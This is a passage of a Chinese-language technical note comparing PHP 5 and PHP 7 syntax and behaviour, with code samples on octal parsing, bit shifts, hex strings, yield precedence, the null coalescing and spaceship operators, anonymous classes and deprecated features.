<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Valid in PHP 5 only.</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$$foo</span>-&gt;bar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Valid in PHP 5 and 7.</span></span><br><span class="line">    <span class="keyword">global</span> $&#123;<span class="variable">$foo</span>-&gt;bar&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="8进制字符容错率降低"><a href="#8进制字符容错率降低" class="headerlink" title="8进制字符容错率降低"></a>8进制字符容错率降低</h2><p>在php5版本，如果一个八进制字符如果含有无效数字，该无效数字将被静默删节。但是在php7.0.0里面会触发一个解析错误。同样在php7.0.0以后被改回去。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 在php5和php7.0.0之外的版本测试结果应该如下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">octdec</span>( <span class="string">&#x27;012999999999999&#x27;</span> ) . <span class="string">&quot;\n&quot;</span>;    <span class="comment">// 10</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">octdec</span>( <span class="string">&#x27;012&#x27;</span> ) . <span class="string">&quot;\n&quot;</span>;                <span class="comment">// 10</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">octdec</span>( <span class="string">&#x27;012999999999999&#x27;</span> )==<span class="title function_ invoke__">octdec</span>( <span class="string">&#x27;012&#x27;</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;: )&quot;</span>. <span class="string">&quot;\n&quot;</span>;                   <span class="comment">// : )</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="负位移运算"><a href="#负位移运算" class="headerlink" title="负位移运算"></a>负位移运算</h2><p>以负数形式进行的位移运算将会抛出一个 <strong>ArithmeticError</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">1</span> &gt;&gt; -<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br><span class="line">int(0)</span><br><span class="line"></span><br><span class="line">PHP7</span><br><span class="line">Fatal error: Uncaught ArithmeticError: Bit shift by negative number in /tmp/test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line">  thrown in /tmp/test.php on line 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="超范围后产生位移"><a href="#超范围后产生位移" class="headerlink" title="超范围后产生位移"></a>超范围后产生位移</h2><p>超出 <code>integer</code>位宽的位移操作（无论哪个方向）将始终得到 0 作为结果。在从前，这一操作是结构依赖的</p>
<h2 id="十六进制字符串规范"><a href="#十六进制字符串规范" class="headerlink" title="十六进制字符串规范"></a>十六进制字符串规范</h2><p>十六进制字符串不再被认为是数字</p>
<p>目前截至最新的PHP7.3版本依然没有改回去的征兆，官方称不会在改了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0x123&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0x123&quot;</span> == <span class="string">&quot;291&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x123&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0xe&quot;</span> + <span class="string">&quot;0x1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;0x1&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<p>左边php5.6，右边php7.2</p>
<p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E8%AF%AD%E6%B3%95%E4%BF%AE%E6%94%B9_1.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.filter-var.php">filter_var()</a> 函数可以用于检查一个 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a> 是否含有十六进制数字,并将其转换为<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.integer.php">integer</a>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0xffff&quot;</span>;</span><br><span class="line"><span class="variable">$int</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$int</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Invalid integer!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$int</span>); <span class="comment">// int(65535)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于新的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.unicode-codepoint-escape-syntax">Unicode codepoint escape syntax</a>语法， 紧连着无效序列并包含<em>\u{</em> 的字串可能引起致命错误。 为了避免这一报错，应该避免反斜杠开头。</p>
<h2 id="移除了-ASP-和-script-PHP-标签"><a href="#移除了-ASP-和-script-PHP-标签" class="headerlink" title="移除了 ASP 和 script PHP 标签"></a>移除了 ASP 和 script PHP 标签</h2><p>使用类似 ASP 的标签，以及 script 标签来区分 PHP 代码的方式被移除。 受到影响的标签有：</p>
<table>
<thead>
<tr>
<th align="left">开标签</th>
<th align="left">闭标签</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;%</code></td>
<td align="left"><code>%&gt;</code></td>
</tr>
<tr>
<td align="left"><code>&lt;%=</code></td>
<td align="left"><code>%&gt;</code></td>
</tr>
<tr>
<td align="left"><code>&lt;script language=&quot;php&quot;&gt;</code></td>
<td align="left"><code>&lt;/script&gt;</code></td>
</tr>
</tbody></table>
<h2 id="yield-变更为右联接运算符"><a href="#yield-变更为右联接运算符" class="headerlink" title="yield 变更为右联接运算符"></a>yield 变更为右联接运算符</h2><p>在使用 <code>yield</code> 关键字的时候，不再需要括号， 并且它变更为右联接操作符，其运算符优先级介于 <em>print</em> 和 <em>&#x3D;&gt;</em> 之间。 这可能导致现有代码的行为发生改变：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">yield</span> -<span class="number">1</span>;</span><br><span class="line"><span class="comment">// 在之前版本中会被解释为：</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">yield</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 现在，它将被解释为：</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">yield</span> (-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">yield</span> <span class="variable">$foo</span> <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"><span class="comment">// 在之前版本中会被解释为：</span></span><br><span class="line"><span class="keyword">yield</span> (<span class="variable">$foo</span> <span class="keyword">or</span> <span class="keyword">die</span>);</span><br><span class="line"><span class="comment">// 现在，它将被解释为：</span></span><br><span class="line">(<span class="keyword">yield</span> <span class="variable">$foo</span>) <span class="keyword">or</span> <span class="keyword">die</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过使用括号来消除歧义。</p>
<h2 id="关于对引用数组元素创建的变量的顺序变化"><a href="#关于对引用数组元素创建的变量的顺序变化" class="headerlink" title="关于对引用数组元素创建的变量的顺序变化"></a>关于对引用数组元素创建的变量的顺序变化</h2><p>有如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = [];</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;a&quot;</span>] =&amp; <span class="variable">$array</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;b&quot;</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;b&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PHP7</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">  [&quot;b&quot;]=&gt;</span><br><span class="line">  &amp;int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NULL合并运算符"><a href="#NULL合并运算符" class="headerlink" title="NULL合并运算符"></a>NULL合并运算符</h2><p>由于日常使用中存在大量同时使用三元表达式和 <code>isset()</code>的情况， 我们添加了null合并运算符 (<em>??</em>) 这个语法糖。如果变量存在且值不为<strong>NULL</strong>， 它就会返回自身的值，否则返回它的第二个操作数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sss</span>=<span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$sss</span> ?? <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sss</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$sss</span> ?? <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$bbb</span> ?? <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">aaa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">aaa</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="太空船操作符（组合比较符）"><a href="#太空船操作符（组合比较符）" class="headerlink" title="太空船操作符（组合比较符）"></a>太空船操作符（组合比较符）</h2><p>太空船操作符用于比较两个表达式。当$a小于、等于或大于$b时它分别返回-1、0或1。 比较的原则是沿用 PHP 的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/types.comparisons.php"><strong>常规比较规则</strong></a>进行的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 整数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">2</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">2.5</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> &lt;=&gt; <span class="string">&quot;a&quot;</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> &lt;=&gt; <span class="string">&quot;b&quot;</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b&quot;</span> &lt;=&gt; <span class="string">&quot;a&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h2><p>现在支持通过<em>new class</em> 来实例化一个匿名类，这可以用来替代一些“用后即焚”的完整类定义。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$msg</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getLogger</span>(<span class="params"></span>): <span class="title">Logger</span> </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setLogger</span>(<span class="params">Logger <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Application</span>;</span><br><span class="line"><span class="variable">$app</span>-&gt;<span class="title function_ invoke__">setLogger</span>(<span class="keyword">new</span> <span class="keyword">class</span> <span class="keyword">implements</span> Logger &#123;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_ invoke__">log</span>(<span class="keyword">string</span> <span class="variable">$msg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$app</span>-&gt;<span class="title function_ invoke__">getLogger</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(class<span class="doctag">@anonymous</span>)#2 (0) &#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Unicode-codepoint-转译语法"><a href="#Unicode-codepoint-转译语法" class="headerlink" title="Unicode codepoint 转译语法"></a>Unicode codepoint 转译语法</h2><p>这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\u&#123;aa&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\u&#123;0000aa&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\u&#123;9999&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="导入use声名组"><a href="#导入use声名组" class="headerlink" title="导入use声名组"></a>导入use声名组</h2><p>从同一 <code>namespace</code> 导入的类、函数和常量现在可以通过单个 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.namespaces.importing.php"><em>use</em></a> 语句 一次性导入了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP 7 之前的代码</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ClassA</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ClassB</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ClassC</span> <span class="keyword">as</span> <span class="title">C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">fn_a</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">fn_b</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">fn_c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">const</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ConstA</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">const</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ConstB</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">const</span> <span class="title">some</span>\<span class="title">namespace</span>\<span class="title">ConstC</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP 7+ 及更高版本的代码</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">some</span>\<span class="title">namespace</span>\&#123;<span class="title">ClassA</span>, <span class="title">ClassB</span>, <span class="title">ClassC</span> <span class="keyword">as</span> <span class="title">C</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">some</span>\<span class="title">namespace</span>\&#123;<span class="title">fn_a</span>, <span class="title">fn_b</span>, <span class="title">fn_c</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">const</span> <span class="title">some</span>\<span class="title">namespace</span>\&#123;<span class="title">ConstA</span>, <span class="title">ConstB</span>, <span class="title">ConstC</span>&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="放宽了保留词限制"><a href="#放宽了保留词限制" class="headerlink" title="放宽了保留词限制"></a>放宽了保留词限制</h2><p>现在允许全局保留词用于类&#x2F;接口&#x2F;Trait 中的属性、常量和方法名。 在引入新关键词时，此变更减少了对向后兼容的破坏，避免了 API 命名的限制。</p>
<p>使用流畅的接口实现内部 DSL 时，这非常有用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 以前不能用  &#x27;new&#x27;、&#x27;private&#x27; 和 &#x27;for&#x27;</span></span><br><span class="line"><span class="title class_">Project</span>::<span class="keyword">new</span>(<span class="string">&#x27;Project Name&#x27;</span>)-&gt;<span class="keyword">private</span>()-&gt;<span class="keyword">for</span>(<span class="string">&#x27;purpose here&#x27;</span>)-&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;username here&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>唯一的限制是： <em>class</em>关键词不能用于常量名，否则会和 类名解析语法冲突 (<em>ClassName::class</em>)。</p>
<h2 id="（弃用）PHP4-风格的构造函数"><a href="#（弃用）PHP4-风格的构造函数" class="headerlink" title="（弃用）PHP4 风格的构造函数"></a>（弃用）PHP4 风格的构造函数</h2><p>PHP4 风格的构造函数（方法名和类名一样）将被弃用，并在将来移除。 如果在类中仅使用了 PHP4 风格的构造函数，PHP7 会产生 <strong>E_DEPRECATED</strong> 警告。 如果还定义了 <strong>__construct()</strong> 方法则不受影响。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;I am the constructor&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="（弃用）静态调用非静态的方法"><a href="#（弃用）静态调用非静态的方法" class="headerlink" title="（弃用）静态调用非静态的方法"></a>（弃用）静态调用非静态的方法</h2><p>废弃了<strong>静态</strong>调用未声明成 <strong>static</strong> 的方法，未来可能会彻底移除该功能。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;I am not static!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo::<span class="title function_ invoke__">bar</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="错误和异常处理相关的变更-¶"><a href="#错误和异常处理相关的变更-¶" class="headerlink" title="错误和异常处理相关的变更 ¶"></a>错误和异常处理相关的变更<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.error-handling"> ¶</a></h2><h2 id="HTTP-RAW-POST-DATA-被移除-¶"><a href="#HTTP-RAW-POST-DATA-被移除-¶" class="headerlink" title="$HTTP_RAW_POST_DATA 被移除 ¶"></a>$HTTP_RAW_POST_DATA 被移除<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.http-raw-post-data"> ¶</a></h2><h2 id="从不匹配的上下文发起调用-¶"><a href="#从不匹配的上下文发起调用-¶" class="headerlink" title="从不匹配的上下文发起调用 ¶"></a>从不匹配的上下文发起调用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.incompatible-this"> ¶</a></h2><h2 id="函数定义不可以包含多个同名参数-¶"><a href="#函数定义不可以包含多个同名参数-¶" class="headerlink" title="函数定义不可以包含多个同名参数 ¶"></a>函数定义不可以包含多个同名参数<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameters"> ¶</a></h2><h2 id="在函数中检视参数值会返回-当前-的值-¶"><a href="#在函数中检视参数值会返回-当前-的值-¶" class="headerlink" title="在函数中检视参数值会返回 当前 的值 ¶"></a>在函数中检视参数值会返回 <em>当前</em> 的值<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameter-modified"> ¶</a></h2><h2 id="INI-文件中-注释格式被移除-¶"><a href="#INI-文件中-注释格式被移除-¶" class="headerlink" title="INI 文件中 # 注释格式被移除 ¶"></a>INI 文件中 <em>#</em> 注释格式被移除<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.ini-comments"> ¶</a></h2><h2 id="Switch-语句不可以包含多个-default-块-¶"><a href="#Switch-语句不可以包含多个-default-块-¶" class="headerlink" title="Switch 语句不可以包含多个 default 块 ¶"></a>Switch 语句不可以包含多个 default 块<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.multiple-default"> ¶</a></h2><h2 id="JSON-扩展已经被-JSOND-取代-¶"><a href="#JSON-扩展已经被-JSOND-取代-¶" class="headerlink" title="JSON 扩展已经被 JSOND 取代 ¶"></a>JSON 扩展已经被 JSOND 取代<a target="_blank" rel="noopener" 